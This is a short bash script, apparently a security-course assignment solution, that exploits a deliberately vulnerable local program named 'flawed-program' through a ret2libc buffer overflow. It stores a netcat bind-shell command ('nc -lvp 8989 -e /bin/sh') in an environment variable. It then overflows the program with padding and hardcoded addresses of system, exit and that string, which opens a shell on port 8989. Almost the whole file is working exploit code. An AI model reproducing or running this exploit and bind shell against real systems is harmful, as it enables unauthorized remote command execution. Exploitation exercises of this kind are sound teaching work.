#!/bin/bash

# This works without using root

# Create environment variable
export NC="nc -lvp 8989 -e /bin/sh"

echo "Open port here!"
echo $NC

# CD to the assignment directory
cd ./assignment

# make the project
make -s

# ret2libc exploit (invoke env variable NC)
#0xf7e1bf10:	system
#0xf7e0f160:	exit
#0xffffdb9b:	nc -lvp 8989 -e /bin/bash (on stack)
#0xffffdbbe:	nc -lvp 8989 -e /bin/bash (at runtime)
./flawed-program $(python -c 'print("A"*17 + 
		"\x10\xbf\xe1\xf7" + 
		"\x60\xf1\xe0\xf7" + 
		"\xbe\xdb\xff\xff")')